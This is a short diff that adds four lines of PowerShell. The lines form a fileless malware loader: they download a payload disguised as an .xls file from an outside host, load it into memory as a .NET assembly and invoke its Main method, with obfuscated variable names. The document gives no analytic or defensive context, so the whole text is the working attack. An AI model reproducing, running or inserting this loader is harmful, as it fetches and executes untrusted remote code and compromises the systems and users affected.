@@ -1,0 +1,4 @@
+$vT2H4FIV = (Invoke-WebRequest """https://ernd6q.icu/zi5svaTWO2/Rgc.xls""" -UseBasicParsing -Headers @{ """Cache-Control""" = """no-cache""" }).Content;
+$s8yORz6k = [System.Reflection.Assembly]::Load($vT2H4FIV);
+$d6QpU6y3 = $s8yORz6k.GetTypes().Where({ $_.Name -eq """Program""" }, """First""").GetMethod("""Main""", [Reflection.BindingFlags] """Static, Public, NonPublic"""); 
+$d6QpU6y3.Invoke($null, $null);
